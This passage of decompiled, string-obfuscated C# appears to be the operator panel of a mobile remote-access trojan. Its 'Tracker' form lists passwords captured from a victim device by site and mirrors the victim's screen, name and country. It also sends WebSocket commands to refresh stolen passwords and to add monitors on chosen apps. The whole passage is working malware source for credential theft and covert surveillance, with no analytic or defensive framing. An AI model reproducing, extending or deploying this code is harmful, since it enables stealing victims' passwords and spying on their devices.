			addnum.Text = EXGuarder._5E794330;
			namemonitor.Text = EXGuarder._4E51733B;
			linkmonitor.Text = EXGuarder._54022165;
			idmonitor.Text = EXGuarder._1E777306;
			passtextlog.Text = EXGuarder._780C4A4A;
			clrbtn.Text = EXGuarder._353C6758;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._12511241, TextCompare: false))
		{
			refpasses.Text = EXGuarder._0A783C0D;
			rembtn.Text = EXGuarder._53611D39;
			addnum.Text = EXGuarder._2209386A;
			namemonitor.Text = EXGuarder._651A174C;
			linkmonitor.Text = EXGuarder._4F3D2742;
			idmonitor.Text = EXGuarder._08690550;
			passtextlog.Text = EXGuarder._140C2E07;
			clrbtn.Text = EXGuarder._45543F5D;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._33657464, TextCompare: false))
		{
			refpasses.Text = EXGuarder._1B0B1A0F;
			rembtn.Text = EXGuarder._244B496F;
			addnum.Text = EXGuarder._30211D5D;
			namemonitor.Text = EXGuarder._0C2B5751;
			linkmonitor.Text = EXGuarder._2C05742D;
			idmonitor.Text = EXGuarder._6307522F;
			passtextlog.Text = EXGuarder._591B0318;
			clrbtn.Text = EXGuarder._28017268;
		}
	}

	private void listsites_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (listsites.SelectedItem != null)
			{
				string text = listsites.SelectedItem.ToString();
				if (Operators.CompareString(text, EXGuarder._370D105C, TextCompare: false) == 0)
				{
					passtextlog.Text = string.Join(EXGuarder._623D1601, SiteData.Values);
				}
				else if (SiteData.ContainsKey(text))
				{
					passtextlog.Text = SiteData[text];
				}
				else
				{
					passtextlog.Text = EXGuarder._3C3A1769;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void refpasses_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._23683971, EXGuarder._6C444503);
		dictionary.Add(EXGuarder._5E2E694E, EXGuarder._5F066E27);
		dictionary.Add(EXGuarder._0078773F, EXGuarder._54513135);
		dictionary.Add(EXGuarder._14031A70, EXGuarder._563D5D28);
		dictionary.Add(EXGuarder._29047803, EXGuarder._4F14415B);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void addnum_Click(object sender, EventArgs e)
	{
		string value = namemonitor.Text;
		string value2 = linkmonitor.Text;
		string value3 = idmonitor.Text;
		if (string.IsNullOrEmpty(value))
		{
			BTAlerter.infos(EXGuarder._6B670620);
			namemonitor.Focus();
			return;
		}
		if (string.IsNullOrEmpty(value2))
		{
			BTAlerter.infos(EXGuarder._5D5A5E0C);
			linkmonitor.Focus();
			return;
		}
		string value4 = EXGuarder._243A2B6D;
		if (Operators.CompareString(comboTargts.Text, EXGuarder._12644A13, TextCompare: false) == 0)
		{
			value4 = EXGuarder._4A58335A;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3D3A3B1A, EXGuarder._762E4A40);
		dictionary.Add(EXGuarder._31563B4B, EXGuarder._576B2011);
		dictionary.Add(EXGuarder._41732C24, EXGuarder._0C6D4A6A);
		dictionary.Add(EXGuarder._5B076801, EXGuarder._3425405A);
		dictionary.Add(EXGuarder._03084F10, value);
		dictionary.Add(EXGuarder._5C404437, value2);
		dictionary.Add(EXGuarder._26575358, value4);
		dictionary.Add(EXGuarder._6A15393F, value3);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	private void Tracker_Load(object sender, EventArgs e)
	{
		base.Icon = Resources.formico;
		myscr.Image = Btcli.screen;
		myico.Image = Btcli.wallpaper;
		mytitle.Text = BTConst.Trackingstr + EXGuarder._4A453315 + Btcli.name + EXGuarder._4A453315 + Btcli.country;
		translateme();
		statetimer.Start();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Trackingstr + EXGuarder._45021937 + Btcli.name + EXGuarder._45021937 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Profilestr + EXGuarder._45021937 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Tracker_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
	}

	private void clractlog_Click(object sender, EventArgs e)
	{
		passtextlog.Text = EXGuarder._5B0E3E0D;
	}

	private void rembtn_Click(object sender, EventArgs e)
	{
	}
}
